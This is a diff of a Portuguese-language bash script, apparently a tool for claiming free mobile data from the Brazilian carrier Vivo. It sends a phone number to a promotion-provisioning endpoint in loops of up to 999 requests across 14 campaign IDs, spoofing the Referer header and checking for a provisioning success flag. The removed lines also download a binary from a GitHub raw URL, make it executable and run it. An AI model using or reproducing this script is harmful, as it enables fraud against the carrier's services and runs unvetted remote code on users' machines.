@@ -1,134 +1,255 @@
 #!/bin/bash
 clear
-echo -e "   ⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀
- ⣴⣿⣿⡿⣿⢿⣟⣿⣻⣟⡿⣟⣿⣟⡿⣟⣿⣻⣟⣿⣻⢿⣻⡿⣿⢿⣷⣆
-⢘⣿⢯⣷⡿⡿⡿⢿⢿⣷⣯⡿⣽⣞⣷⣻⢯⣷⣻⣾⡿⡿⢿⢿⢿⢯⣟⣞⡮
-⢸⢞⠟⠃⣉⢉⠉⠉⠓⠫⢿⣿⣷⢷⣻⣞⣿⣾⡟⠽⠚⠊⠉⠉⠉⠙⠻⣞⢵
-⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗
-⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎
-⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮
-⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗
-⢻⡿⡿⣟⣿⣻⣽⣟⣿⢯⣟⣞⡷⣿⣿⣯⢿⢽⢯⣿⣻⣟⣿⣻⣟⣿⣻⢿⣿
-⡑⡏⠯⡯⡳⡯⣗⢯⢟⡽⣗⣯⣟⣿⣿⣾⣫⢿⣽⠾⡽⣺⢳⡫⡞⡗⡝⢕⠕
-⢂⡎⠅⡃⢇⠇⠇⣃⣧⡺⡻⡳⡫⣿⡿⣟⠞⠽⠯⢧⣅⣃⠣⠱⡑⡑⠨⢐⢌
-⠐⠼⣦⢀⠄⣶⣿⢿⣿⣧⣄⡌⠂⠢⠩⠂⠑⣁⣅⣾⢿⣟⣷⠦⠄⠄⡤⡇⡪
- ⠨⢻⣧⡅⡈⠛⠿⠿⠿⠛⠁⠄⢀⡀⠄⠄⠘⠻⠿⠿⠯⠓⠁⢠⣱⡿⢑⠄
- ⠈⢌⢿⣷⡐⠤⣀⣀⣂⣀⢀⢀⡓⠝⡂⡀⢀⢀⢀⣀⣀⠤⢊⣼⡟⡡⡁
-  ⠈⢢⠚⣿⣄⠈⠉⠛⠛⠟⠿⠿⠟⠿⠻⠻⠛⠛⠉⠄⣠⠾⢑⠰⠈
-    ⠑⢌⠿⣦⡡⣱⣸⣸⣆⠄⠄⠄⣰⣕⢔⢔⠡⣼⠞⡡⠁
-      ⠑⢝⢷⣕⡷⣿⡿⠄⠄⠠⣿⣯⣯⡳⡽⡋⠌
-        ⠙⢮⣿⣽⣯⠄⠄⢨⣿⣿⡷⡫⠃
-          ⠘⠙⠝⠂⠄⢘⠋⠃ "
-sleep 1
-echo ""
-echo -e "    \033[0m\033[01;37m• \033[01;33mautomático Token MB Vivo \033[0m\033[01;37m•\033[0m"
-echo -e "\033[01;37mTrue = \033[01;32m Aprovado \033[01;37m| False = \033[01;31m  Relaxe"
-sleep 1
-echo -e "\033[01;32m Cola seu DDD+NÚMERO\033[01;37m"
-read NUMERO
-echo -e "\033[01;32m Repetir quantas vezes?\033[1;37m"
-read VEZES
-echo -e "\033[01;32m É hora do show\033[1;37m"
-sleep 1
-echo ""
-echo -e "\033[0m\033[01;33m vai brasiliam\033[03;037m"
+tit=$"ㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⠋⠉⠙⠻⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣶⣶⣦⣬⢹⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⣰⣧⡀⠄⠄⠄⠄⠈⢙⡋⣿⣿⣿⢸⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠰⠼⢯⣿⣿⣦⣄⠄⠄⠄⠈⢡⣿⣿⣿⢸⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠸⠤⠕⠛⠙⠷⣿⡆⠄⠄⠄⣸⣿⣿⡏⣼⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⢡⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣄⠄⢀⠄⠄⢀⣤⣾⣿⣿⣿⢃⣾⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⠿⣛⣡⣄⣀⠄⠠⢴⣿⣿⡿⣄⣴⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣩⡽⡁⢸⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⢃⣿⣿⢟⣿⣿⣿⣿⣿⣮⢫⣿⣿⣿⣿⣿⣟⢿⠃⠄⢻⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⡿⣸⠟⣵⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣷⣄⢰⡄⢿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⡇⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⡎⣿⣿⣿\n\e[33;01m██▀ﾠ█▄█ﾠ█ﾠ▄▀▀ﾠ▄▀▄ﾠ█▀▄ﾠ██▀ﾠ█▄ﾠ█ﾠ██▀ﾠ█▀▄\n█▄▄ﾠ█ﾠ█ﾠ█ﾠ▄██ﾠ▀▄▀ﾠ█▀ﾠﾠ█▄▄ﾠ█ﾠ▀█ﾠ█▄▄ﾠ█▀▄\e[0m\nㅤㅤ⡀⠈⢿⠄⣿⡇⠄⠙⠿⣿⡿⠿⢋⣥⣾⣿⣷⣌⠻⢿⣿⣿⡿⠟⣡⣾⣿⣿⠿⢋\nㅤㅤ⠛⠳⠄⢠⣿⠇⠄⣷⡑⢶⣶⢿⣿⣿⣿⣽⣿⣿⣿⣶⣶⡐⣶⣿⠿⠛⣩⡄⠄⢸"
+echo -e $tit
+sleep .5
+echo
+echo -e "\e[01;37;41m      • TESTADOR AUTOMÁTICO •        \e[0m"
+sleep .5
+echo
+echo -e "\e[01;37;41m Coloque seu 55+DDD+NÚMERO \e[0m"
+aa=$(echo -e "\e[01;37mNÚMERO:\e[0m")
+read -p "$aa" NUMERO
+VEZES="999"
+clear
+echo -e $tit
+echo
+echo -e "\e[01;37;41m      • TESTADOR AUTOMÁTICO •        \e[0m"
+sleep .5
+echo
+echo -e "\e[01;37;41m VAI BRASILIAM \e[0m"|pv -qL 15
+echo -e "\e[01;37;41m NUMERO: $NUMERO \e[0m"
+echo
+sleep .5
+
+echo -e "\e[0m\e[01;37;41m TOKEN 1 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=02f76cd1-eead-44ff-88dd-aa69538c7aef&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=02f76cd1-eead-44ff-88dd-aa69538c7aef&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo -e ""
-echo -e "\033[0m\033[01;33mtá no 2\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 2 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=949e575a-6db8-4608-8b71-1281e6e506df&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=949e575a-6db8-4608-8b71-1281e6e506df&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 3\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 3 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=04e564c7-f410-49f5-8dee-b268eaef5223&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=04e564c7-f410-49f5-8dee-b268eaef5223&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 4\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 4 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=4919b47c-f588-4e71-87e3-639b3af92e4d&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=4919b47c-f588-4e71-87e3-639b3af92e4d&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 5\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 5 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=3e0a2f54-101a-427a-999e-2ede723c3b42&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=3e0a2f54-101a-427a-999e-2ede723c3b42&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 6\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 6 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=03bc4539-13db-4045-9119-a937eb48d41d&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=03bc4539-13db-4045-9119-a937eb48d41d&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 7\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 7 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=cd5f56de-4ed9-484f-9c32-c8f6eedb08e7&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=cd5f56de-4ed9-484f-9c32-c8f6eedb08e7&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais \e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 8\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 8 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=7398de8b-48fa-48eb-9a59-562b2a0fba3e&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=7398de8b-48fa-48eb-9a59-562b2a0fba3e&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 9\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 9 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=04e564c7-f410-49f5-8dee-b268eaef5223&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=04e564c7-f410-49f5-8dee-b268eaef5223&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 10\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 10 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=b276dbcf-f384-499c-b492-741943071b76&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=b276dbcf-f384-499c-b492-741943071b76&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 11\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 11 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=02f76cd1-eead-44ff-88dd-aa69538c7aef&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=02f76cd1-eead-44ff-88dd-aa69538c7aef&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 12\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 12 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=23a6eb53-cf15-4354-a357-b497de3bcc1e&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=23a6eb53-cf15-4354-a357-b497de3bcc1e&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 13\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 13 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=7c732700-bfac-40bf-9805-e5a3ab5d872d&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=7c732700-bfac-40bf-9805-e5a3ab5d872d&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mINICIANDO PRÓXIMO TOKEN...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 "; echo $response; break
+esac
 done
-echo ""
-echo -e "\033[0m\033[01;33mtá no 14\033[03;037m"
+echo
+
+echo -e "\e[0m\e[01;37;41m TOKEN 14 \e[0m"
 for i in $(seq $VEZES);
 do
-data=$"msisdn=$NUMERO&campid=288b9ca4-b405-4d2a-b7a5-53aff22118a9&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
-echo -e "\033[0m\033[01;32mmais:\033[01;37m$i\033[03;037m"
+response=$(data=$"msisdn=$NUMERO&campid=288b9ca4-b405-4d2a-b7a5-53aff22118a9&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mCerto, mais\e[0m \e[01;37mFINALIZANDO...\e[0m"|pv -qL 20; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo -e "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 \e[0m \e[01;37mFINALIZANDO...\e[0m"; echo $response; break
+esac
 done
-echo ""
-echo -e "        \033[0m\033[01;37m• \033[01;32mFim de transmissão \033[01;37m•\033[0m"
-sleep 1
-curl -sO https://raw.githubusercontent.com/leitura/ospacotesmb/main/mbsfree && chmod 777 mbsfree && ./mbsfree
+echo -e "\e[01;37;41m          NUNCA É UM ADEUS           \e[0m"|pv -qL 20
+echo -e "\e[01;37;41m Pode testar a opção 'MB até o talo' \e[0m"|pv -qL 20; sleep 1.5
+echo -e "\e[01;37;41m      Se você achar que aguenta      \e[0m"; sleep 2
+echo
+echo -e "\e[01;37;41m       • Fim de transmissão •        \e[0m"
+echo -e '\e[01;37;41m    Não me viu chegando? quer mais?  \e[0m'
+sleep .5
+while :; do
+echo -e '\e[01;37m(1)\e[0m Sim\e[0m'
+echo -e '\e[01;37m(2)\e[0m Não\e[0m'
+cc=$(echo -e "\e[01;37mOpção:\e[0m")
+read -n1 -p "$cc" cpo
+case $cpo in
+        (1) echo; echo -e '\e[01;37;41m E lá vamos nós | @EhisOpeNer \e[0m'|pv -qL 18
+        sleep 2; ./padrao
+        break;;
+        (2) echo; echo -e "\e[01;37;41m Bye Bye | @EhisOpeNer \e[0m"|pv -qL 15; echo -e "\e[01;37;41m     TUDO NUMA BOA     \e[0m"|pv -qL 18
+        sleep 1
+        break;;
+        (*) echo; echo -e "\e[01;37;41m CALMA BARBOLETA \e[0m"
+        sleep 1
+esac
+done
